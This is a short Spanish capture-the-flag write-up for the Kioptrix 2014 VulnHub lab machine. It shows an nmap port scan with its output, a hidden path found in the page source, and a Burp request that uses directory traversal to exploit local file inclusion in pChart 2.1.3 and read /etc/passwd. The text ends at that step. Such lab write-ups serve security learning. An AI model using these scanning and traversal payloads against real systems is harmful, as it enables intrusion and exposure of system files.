# KIOPTRIX2014
Desarrollo del CTF KIOPTRIX2014. Download the VM: https://www.vulnhub.com/entry/kioptrix-2014-5,62/

Importante: Al añadir la máquina Virtual, crear una nueva VM que se compatible con VM Workstation 10.

## Escaneo de Puertos
```
root@kali:~/KIOPTRIX2014# nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.1.105
PORT     STATE  SERVICE REASON         VERSION
22/tcp   closed ssh     reset ttl 64
80/tcp   open   http    syn-ack ttl 64 Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    syn-ack ttl 64 Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
``` 

## Enumeración de archivos y carpetas

1. La enumeración con GOBUSTER no nos brinda ninguna carpeta o archivo de utilidad.
2. Revisando el código HTML de la página obtenemos la siguiente ruta: pChart2.1.3/index.php
```
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```
## Identificación de LFI (Local File Inclusion)

1. PROXY BURP para identificar URL vulnerable:
```
GET /pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../etc/passwd 
```






